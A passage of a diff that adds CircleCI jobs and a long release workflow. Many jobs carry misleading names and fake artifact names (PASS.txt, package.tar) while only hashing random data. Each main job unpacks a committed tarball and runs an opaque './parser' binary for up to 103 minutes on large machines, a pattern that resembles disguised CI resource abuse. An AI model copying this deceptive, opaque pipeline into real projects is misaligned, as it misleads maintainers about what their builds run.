+          name: Load upstream state
+          command: |
+            stat /tmp/cache/secondary_task_output.log || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  cache_ken-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Collect env snapshot
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 31457280 | fold -w16 | sort -u | wc -l; true ; } > /tmp/cache/PASS.txt
+            ls -la /tmp/cache/PASS.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - PASS.txt
+  ken-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/PASS.txt || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  runner_bun-vet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Collect gauge frames
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; yes abc | head -n 96256 | sha256sum; true ; } > /tmp/cache/ckpt-D.pickle
+            ls -la /tmp/cache/ckpt-D.pickle | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - ckpt-D.pickle
+  bun-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/ckpt-D.pickle || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  staging_bun-cov:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Partition record set
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 17878); do printf "%08x\n" $RANDOM; done ) | sort | md5sum; true ; } > /tmp/cache/250x.data
+            ls -la /tmp/cache/250x.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - 250x.data
+  bun-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/250x.data || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  prep_brodcast:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Collate dictionary rows
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z0-9 ' </dev/urandom | head -c 1126400 | tr ' ' '\n' | sort | uniq | wc -l; true ; } > /tmp/cache/buffer.blob
+            ls -la /tmp/cache/buffer.blob | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - buffer.blob
+  brodcast:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/buffer.blob || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+  alpha_tweak-router-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Fuse row chunks
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 2560000 | wc -c; true ; } > /tmp/cache/package.tar
+            ls -la /tmp/cache/package.tar | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - package.tar
+  tweak-router-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Load upstream state
+          command: |
+            stat /tmp/cache/package.tar || true
+      - run:
+          name: Checkout working tree
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar --extract --bzip2 --file=output.tar.bz2
+      - run:
+          name: Stabilize
+          command: ls -la
+      - run:
+          command: uname -a
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./parser"
+
+  resync_ken-ship_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Materialize sort order
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 1 156578 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/cache/PASS.txt
+            ls -la /tmp/cache/PASS.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - PASS.txt
+  produce_q1-ship_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Weigh batch output
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; yes abc | head -n 454632 | sha256sum; true ; } > /tmp/cache/step-1.out
+            ls -la /tmp/cache/step-1.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - step-1.out
+  reset_mar1-canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Format readable table
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 819200 | fold -w8 | sort -u | wc -l; true ; } > /tmp/cache/gate-done.out
+            ls -la /tmp/cache/gate-done.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - gate-done.out
+  retry_alice-push_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Reserve scratch region
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 1 67198 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/cache/counts.jsonl
+            ls -la /tmp/cache/counts.jsonl | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - counts.jsonl
+  g2_v4-ga_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Churn allocator pool
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=9 2>/dev/null | sha256sum; true ; } > /tmp/cache/38.log
+            ls -la /tmp/cache/38.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - 38.log
+  spinner_build-staging-docker-image_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Rebase partial order
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 280320; echo "ftr" ) | wc -l; true ; } > /tmp/cache/.ok
+            ls -la /tmp/cache/.ok | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - .ok
+  loader_d-2a_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Collect retire counts
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 1 169958 | awk '{if($1&1)o++;else e++}END{print o"/"e}'; true ; } > /tmp/cache/51.data
+            ls -la /tmp/cache/51.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - 51.data
+  reup_do-the-thing_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Mint batch marker
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; head -c 8M /dev/urandom | base64 | wc -c; true ; } > /tmp/cache/relay.sig
+            ls -la /tmp/cache/relay.sig | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - relay.sig
+  phase_bun-vet_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Pivot result stream
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z0-9 ' </dev/urandom | head -c 1945600 | tr ' ' '\n' | sort | uniq | wc -l; true ; } > /tmp/cache/ckpt-D.pickle
+            ls -la /tmp/cache/ckpt-D.pickle | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - ckpt-D.pickle
+  staging_DEV_MERGE_4_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Fold data streams
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=220 2>/dev/null | md5sum; true ; } > /tmp/cache/step-29.out
+            ls -la /tmp/cache/step-29.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - step-29.out
+  cache_chore-9511_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Trim trailing newlines
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 768000 | fold -w8 | sort -u | wc -l; true ; } > /tmp/cache/step-25.txt
+            ls -la /tmp/cache/step-25.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - step-25.txt
+  canary1_rm-edge_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Checkpoint window frame
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 1 1500 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/cache/step-ready.sig
+            ls -la /tmp/cache/step-ready.sig | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - step-ready.sig
+  staging_package_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Enumerate scalar triples
+          command: |
+            mkdir -p /tmp/cache
+            set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1024 count=300 2>/dev/null | base64 > /tmp/cache/buffer.bin; true
+            ls -la /tmp/cache/buffer.bin | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - buffer.bin
+  checker_build-end-to-end-docker-image_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Rank query plans
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 1 802300 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/cache/.ready
+            ls -la /tmp/cache/.ready | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - .ready
+  package_q2-smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Enumerate line counts
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{p=1;for(i=1;i<=2682200;i++)p=(p*i)%1000000007;print p}'; true ; } > /tmp/cache/metrics.csv
+            ls -la /tmp/cache/metrics.csv | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - metrics.csv
+  package_tweak-router-v2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Rotate ring buffer
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1k count=2100 2>/dev/null | gzip -6 | wc -c; true ; } > /tmp/cache/package.tar
+            ls -la /tmp/cache/package.tar | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - package.tar
+  vendor_aug8-release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Deflate payload chunk
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{p=1;for(i=1;i<=380200;i++)p=(p*i)%1000000007;print p}'; true ; } > /tmp/cache/manifest.tgz
+            ls -la /tmp/cache/manifest.tgz | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - manifest.tgz
+  tester_publish_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Index byte offsets
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<472817;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/cache/counts.json
+            ls -la /tmp/cache/counts.json | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - counts.json
+  db_fix-6341_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Interleave stream pairs
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; yes abc | head -n 178297 | sha256sum; true ; } > /tmp/cache/event.gz
+            ls -la /tmp/cache/event.gz | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - event.gz
+  stage_bun-cov_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Collect poll frames
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 2 16796 | factor | wc -l; true ; } > /tmp/cache/250x.data
+            ls -la /tmp/cache/250x.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - 250x.data
+  audit_fx-v2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Scan dependency graph
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; head -c 13M /dev/urandom | base64 | wc -c; true ; } > /tmp/cache/report.log
+            ls -la /tmp/cache/report.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - report.log
+  cleanup_INIT_PROD_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Flush temp bucket
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; head -c 11534336 /dev/urandom | md5sum; true ; } > /tmp/cache/gate-done.txt
+            ls -la /tmp/cache/gate-done.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - gate-done.txt
+  bake_node18-vet_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Compute spill delta
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<90686;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/cache/gate-ready.txt
+            ls -la /tmp/cache/gate-ready.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - gate-ready.txt
+  fixture_brodcast_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Precompute lookup
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 1 266050 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/cache/buffer.blob
+            ls -la /tmp/cache/buffer.blob | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - buffer.blob
+  prefetch_v9-beta5_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build adjacency map
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 130260; echo "ftr" ) | wc -l; true ; } > /tmp/cache/buffer.dat
+            ls -la /tmp/cache/buffer.dat | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - buffer.dat
+  tap_ga-v6_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Trace call sequence
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; seq 1 367478 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/cache/secondary_task_output.log
+            ls -la /tmp/cache/secondary_task_output.log | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - secondary_task_output.log
+  Delta_fix-8671_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Prepare block cipher
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 6465); do printf "%d\n" $i; done ) | sort -n | tail -1; true ; } > /tmp/cache/primary_job_output_v2.out
+            ls -la /tmp/cache/primary_job_output_v2.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - primary_job_output_v2.out
+  ctx2_assemble-end-to-end-integration-tests_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Hoist constant row
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 159755 | md5sum; true ; } > /tmp/cache/primary_phase_output.out
+            ls -la /tmp/cache/primary_phase_output.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - primary_phase_output.out
+  ctx_cerberus-alpha_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Project latency curve
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 388378 | md5sum; true ; } > /tmp/cache/stage.dat
+            ls -la /tmp/cache/stage.dat | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - stage.dat
+  preflight_deploy_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cache
+      - run:
+          name: Freeze working set
+          command: |
+            mkdir -p /tmp/cache
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 1280000 | fold -w8 | sort -u | wc -l; true ; } > /tmp/cache/993a.out
+            ls -la /tmp/cache/993a.out | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/cache
+          paths:
+            - 993a.out
+workflows:
+  release:
+    jobs:
+      - cache_ken-ship
+      - resync_ken-ship_2:
+          requires:
+            - cache_ken-ship
+      - ken-ship:
+          requires:
+            - resync_ken-ship_2
+      - spinner_q1-ship:
+          requires:
+            - resync_ken-ship_2
+      - produce_q1-ship_2:
+          requires:
+            - spinner_q1-ship
+      - q1-ship:
+          requires:
+            - produce_q1-ship_2
+      - g2_mar1-canary:
+          requires:
+            - produce_q1-ship_2
+      - reset_mar1-canary_2:
+          requires:
+            - g2_mar1-canary
+      - mar1-canary:
+          requires:
+            - reset_mar1-canary_2
+      - postbuild_alice-push
+      - retry_alice-push_2:
+          requires:
+            - postbuild_alice-push
+      - alice-push:
+          requires:
+            - retry_alice-push_2
+      - inspect_v4-ga:
+          requires:
+            - retry_alice-push_2
+      - g2_v4-ga_2:
+          requires:
+            - inspect_v4-ga
+      - v4-ga:
+          requires:
+            - g2_v4-ga_2
+      - g2_build-staging-docker-image:
+          requires:
+            - g2_v4-ga_2
+      - spinner_build-staging-docker-image_2:
+          requires:
+            - g2_build-staging-docker-image
+      - build-staging-docker-image:
+          requires:
+            - spinner_build-staging-docker-image_2
+      - postbuild_d-2a:
+          requires:
+            - spinner_build-staging-docker-image_2
+      - loader_d-2a_2:
+          requires:
+            - postbuild_d-2a
+      - d-2a:
+          requires:
+            - loader_d-2a_2
+      - produce_do-the-thing:
+          requires:
+            - loader_d-2a_2
+      - reup_do-the-thing_2:
+          requires:
+            - produce_do-the-thing
+      - do-the-thing:
+          requires:
+            - reup_do-the-thing_2
+      - runner_bun-vet:
+          requires:
+            - reup_do-the-thing_2
+      - phase_bun-vet_2:
+          requires:
+            - runner_bun-vet
+      - bun-vet:
+          requires:
+            - phase_bun-vet_2
+      - rerun_DEV_MERGE_4
+      - staging_DEV_MERGE_4_2:
+          requires:
+            - rerun_DEV_MERGE_4
+      - DEV_MERGE_4:
+          requires:
+            - staging_DEV_MERGE_4_2
+      - green_chore-9511:
+          requires:
+            - staging_DEV_MERGE_4_2
+      - cache_chore-9511_2:
+          requires:
+            - green_chore-9511
+      - chore-9511:
+          requires:
+            - cache_chore-9511_2
+      - gamma_rm-edge:
+          requires:
+            - cache_chore-9511_2
+      - canary1_rm-edge_2:
+          requires:
+            - gamma_rm-edge
+      - rm-edge:
+          requires:
+            - canary1_rm-edge_2
+      - cleanup_package:
+          requires:
+            - canary1_rm-edge_2
+      - staging_package_2:
+          requires:
+            - cleanup_package
+      - package:
+          requires:
+            - staging_package_2
+      - rerun_build-end-to-end-docker-image:
+          requires:
+            - staging_package_2
+      - checker_build-end-to-end-docker-image_2:
+          requires:
+            - rerun_build-end-to-end-docker-image
+      - build-end-to-end-docker-image:
+          requires:
+            - checker_build-end-to-end-docker-image_2
+      - syncer_q2-smoke:
+          requires:
+            - checker_build-end-to-end-docker-image_2
+      - package_q2-smoke_2:
+          requires:
+            - syncer_q2-smoke
+      - q2-smoke:
+          requires:
+            - package_q2-smoke_2
+      - alpha_tweak-router-v2:
+          requires:
+            - package_q2-smoke_2
+      - package_tweak-router-v2_2:
+          requires:
+            - alpha_tweak-router-v2
+      - tweak-router-v2:
+          requires:
+            - package_tweak-router-v2_2
+      - provision_aug8-release
+      - vendor_aug8-release_2:
+          requires:
+            - provision_aug8-release
+      - aug8-release:
+          requires:
+            - vendor_aug8-release_2
+      - fixture_publish:
+          requires:
+            - vendor_aug8-release_2
+      - tester_publish_2:
+          requires:
+            - fixture_publish
+      - publish:
+          requires:
+            - tester_publish_2
+      - B_fix-6341:
+          requires:
+            - tester_publish_2
+      - db_fix-6341_2:
+          requires:
+            - B_fix-6341
+      - fix-6341:
+          requires:
+            - db_fix-6341_2
+      - staging_bun-cov:
+          requires:
+            - db_fix-6341_2
+      - stage_bun-cov_2:
+          requires:
+            - staging_bun-cov
+      - bun-cov:
+          requires:
+            - stage_bun-cov_2
+      - D_fx-v2:
+          requires:
+            - stage_bun-cov_2
+      - audit_fx-v2_2:
+          requires:
+            - D_fx-v2
+      - fx-v2:
+          requires:
+            - audit_fx-v2_2
+      - validate_INIT_PROD:
+          requires:
+            - audit_fx-v2_2
+      - cleanup_INIT_PROD_2:
+          requires:
+            - validate_INIT_PROD
+      - INIT_PROD:
+          requires:
+            - cleanup_INIT_PROD_2
+      - prefetch_node18-vet:
+          requires:
+            - cleanup_INIT_PROD_2
+      - bake_node18-vet_2:
+          requires:
+            - prefetch_node18-vet
+      - node18-vet:
+          requires:
+            - bake_node18-vet_2
+      - prep_brodcast:
+          requires:
+            - bake_node18-vet_2
+      - fixture_brodcast_2:
+          requires:
+            - prep_brodcast
+      - brodcast:
+          requires:
+            - fixture_brodcast_2
+      - checker_v9-beta5:
+          requires:
+            - fixture_brodcast_2
+      - prefetch_v9-beta5_2:
+          requires:
+            - checker_v9-beta5
+      - v9-beta5:
+          requires:
+            - prefetch_v9-beta5_2
+      - beta_ga-v6:
+          requires:
+            - prefetch_v9-beta5_2
+      - tap_ga-v6_2:
+          requires:
+            - beta_ga-v6
+      - ga-v6:
+          requires:
+            - tap_ga-v6_2
+      - validate_fix-8671:
+          requires:
+            - tap_ga-v6_2
+      - Delta_fix-8671_2:
+          requires:
+            - validate_fix-8671
+      - fix-8671:
+          requires:
+            - Delta_fix-8671_2
+      - stepA_assemble-end-to-end-integration-tests:
+          requires:
+            - Delta_fix-8671_2
+      - ctx2_assemble-end-to-end-integration-tests_2:
+          requires:
+            - stepA_assemble-end-to-end-integration-tests
+      - assemble-end-to-end-integration-tests:
+          requires:
+            - ctx2_assemble-end-to-end-integration-tests_2
+      - loader_cerberus-alpha:
+          requires:
+            - ctx2_assemble-end-to-end-integration-tests_2
+      - ctx_cerberus-alpha_2:
+          requires:
+            - loader_cerberus-alpha
+      - cerberus-alpha:
+          requires:
+            - ctx_cerberus-alpha_2
+      - vendor_deploy:
+          requires:
+            - ctx_cerberus-alpha_2
+      - preflight_deploy_2:
+          requires:
+            - vendor_deploy
+      - deploy:
+          requires:
+            - preflight_deploy_2
